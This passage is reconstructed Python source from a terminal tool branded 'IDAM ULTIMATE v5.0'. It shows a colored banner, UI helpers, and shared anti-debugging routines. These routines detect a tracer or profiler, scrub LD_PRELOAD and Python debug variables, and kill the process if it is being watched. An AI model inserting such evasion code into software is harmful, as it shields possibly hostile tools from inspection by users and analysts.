                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(8)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


sec()


# ==========================================================================
# MODULE: utils/ui.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of utils/ui.py
(deobfuscated from utils/ui.cpython-314-aarch64-linux-android.so).

Terminal banner / info panel for IDAM ULTIMATE v5.0.
"""
import os
import sys
import random

R = '\x1b[0m'
RED = '\x1b[1;31m'
GREEN = '\x1b[1;32m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
MAGENTA = '\x1b[1;35m'
CYAN = '\x1b[1;36m'
WHITE = '\x1b[1;37m'
ORANGE = '\x1b[38;5;196m'
ORANGE2 = '\x1b[38;5;203m'
GREEN2 = '\x1b[38;5;40m'
BAR = '\x1b[38;5;48m' + '│' * 40

VERSION = '5.0 ULTIMATE'
OWNER = 'IDAM EMMANUEL'
GROUP_NAME = 'IDAM OLD CLONE'

____banner____ = (
    '\x1b[1;38;5;190m            \U0001f308   I D A M - U L T I M A T E  v 5 . 0   \U0001f308\x1b[0m'
    '\x1b[1;38;5;196m     \u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557 \x1b[0m'
    '\x1b[1;38;5;202m     \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2551    \u2588\u2588\u2588\u2551   \u2588\u2588\u2588\u2551\u255a\u2550\u2588\u2588\u2557\x1b[0m'
    '\x1b[1;38;5;208m     \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2551    \u2588\u2588\u2588\u2551   \u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2551 \u255a\u2550\u2588\u2588\u2551\x1b[0m'
    '\x1b[1;38;5;214m     \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2588\u255a\u2550\u2588\u2588\u2557\u2588\u2588\u2551    \u2588\u2588\u2588\u2551   \u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2551 \u255a\u2550\u2588\u2588\u2551  \x1b[0m'
    '\x1b[1;38;5;220m     \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2588\u255a\u2550\u2588\u2557 \u2588\u2588\u2551    \u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2557\x1b[0m'
    '\x1b[1;38;5;226m     \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d     \u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d \x1b[0m'
    '         IDAM ULTIMATE v5.0 \u2638\ufe0f\U0001f525'
    '\n\x1b[1;36mPremium \u2022 Fast \u2022 Secure \u2022 Professional\x1b[1;35m'
)

____info____ = (
    '\n\u2551  \U0001f465 W.S GROUP     : '
    '\n\u2551  \U0001f4ac WHATSAPP      : '
    '\n\u2551  \U0001f4a5 VERSION       : '
    '\n\u2560' + '─' * 52 + '\u2563\n'
    '\u2551                \U0001f451 ULTIMATE INFORMATION \U0001f451            \u2551\n'
    '\u255f' + '─' * 52 + '\u2563\n'
    '\u2551  \U0001f4a4 OWNER         : '
    '\n\u255f' + '─' * 52 + '\u2563\n'
    '\u2551         \u26a1 POWERED BY IDAM EMMANUEL \u26a1              \u2551\n'
    '\u255a' + '─' * 52 + '\u255d\n'
)


def clear():
    os.system('clear' if os.name != 'win' else 'cls')


def set_title():
    sys.stdout.write('\x1b]2;\U0001f9b7\u3000IDAM ULTIMATE v5.0\u3000\u2665\ufe0f\x07')
    sys.stdout.flush()


def rad(seq):
    return random.choice(seq)


def win():
    return os.name == 'win'


def show_info():
    print(____info____ + GROUP_NAME + R)


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(3)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)
